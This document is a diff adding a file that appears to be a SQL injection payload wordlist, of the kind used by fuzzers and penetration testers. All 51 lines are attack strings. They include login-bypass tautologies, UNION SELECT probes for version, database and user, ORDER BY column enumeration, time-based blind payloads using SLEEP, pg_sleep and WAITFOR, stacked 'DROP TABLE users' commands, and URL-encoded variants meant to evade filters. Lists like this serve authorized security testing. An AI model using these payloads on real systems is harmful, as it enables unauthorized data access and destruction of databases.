@@ -1,0 +1,51 @@
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin' --
+admin'--
+admin' #
+admin'/*
+' or '1'='1
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or ('1'='1
+') or '1'='1'--
+admin' or '1'='1
+' OR 'x'='x
+' OR "x"="x
+" OR 1=1--
+" OR "1"="1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' GROUP BY 1--
+1' AND 1=1--
+1' AND 1=2--
+1 AND 1=1
+1 AND 1=2
+' AND '1'='1
+' AND '1'='2
+1' WAITFOR DELAY '0:0:5'--
+1; DROP TABLE users--
+'; DROP TABLE users--
+' OR SLEEP(5)--
+' OR pg_sleep(5)--
+' UNION SELECT version()--
+' UNION SELECT database()--
+' UNION SELECT user()--
+' UNION SELECT @@version--
+' AND 1=(SELECT COUNT(*) FROM users)--
+' OR 1=1 LIMIT 1--
+1' AND SUBSTRING(@@version,1,1)='5
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+'+(SELECT * FROM (SELECT(SLEEP(5)))a)+'
+%27+OR+%271%27%3D%271
+%27+OR+1%3D1--
+%2527+OR+%25271%2527%253D%25271
